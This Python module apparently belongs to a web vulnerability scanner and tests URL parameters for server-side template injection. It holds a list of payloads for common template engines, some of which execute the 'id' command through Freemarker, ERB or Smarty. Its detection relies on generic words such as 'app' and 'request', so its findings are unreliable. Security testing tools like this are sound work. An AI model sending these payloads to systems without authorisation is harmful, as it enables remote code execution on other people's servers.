import httpx
import logging
from urllib.parse import urlencode, parse_qs, urlparse

class Module:
    def __init__(self, url, payload_engine, analyzer, verbose=False):
        self.url = url
        self.payload_engine = payload_engine
        self.analyzer = analyzer
        self.verbose = verbose
        self.findings = []

    async def run(self):
        # Test for SSTI in URL parameters
        parsed = urlparse(self.url)
        params = parse_qs(parsed.query)
        for param in params:
            await self.test_parameter(param, params[param][0])
        return self.findings

    async def test_parameter(self, param, original_value):
        # Test SSTI payloads for different template engines
        ssti_payloads = [
            # Jinja2
            '{{7*7}}',
            '{{config}}',
            '{{request}}',
            '{{config.items()}}',
            # Twig
            '{{7*7}}',
            '{{app}}',
            '{{app.request}}',
            # Velocity
            '#set($x=7*7)${x}',
            '${{7*7}}',
            # Freemarker
            '${7*7}',
            '${"freemarker.template.utility.Execute"?new()("id")}',
            # ERB
            '<%=7*7%>',
            '<%=system("id")%>',
            # Smarty
            '{7*7}',
            '{php}echo `id`;{/php}'
        ]
        
        for payload in ssti_payloads:
            if await self.test_ssti(param, payload):
                self.findings.append({
                    'type': 'Server-Side Template Injection',
                    'url': self.url,
                    'parameter': param,
                    'payload': payload,
                    'risk': 'high',
                    'cwe': 'CWE-94',
                    'description': f'SSTI in parameter {param}'
                })

    async def test_ssti(self, param, payload):
        # Test for SSTI
        test_url = self.url.replace(f'{param}={parse_qs(urlparse(self.url).query)[param][0]}', f'{param}={payload}')
        try:
            async with httpx.AsyncClient(timeout=10) as client:
                resp = await client.get(test_url)
                
                # Check for template engine indicators
                indicators = [
                    '49',  # 7*7 result
                    'jinja',  # Jinja2
                    'twig',   # Twig
                    'velocity',  # Velocity
                    'freemarker',  # Freemarker
                    'erb',    # ERB
                    'smarty',  # Smarty
                    'template',  # Generic template
                    'config',  # Jinja2 config
                    'request',  # Request object
                    'app'      # Application object
                ]
                
                for indicator in indicators:
                    if indicator in resp.text.lower():
                        return True
        except Exception:
            pass
        return False 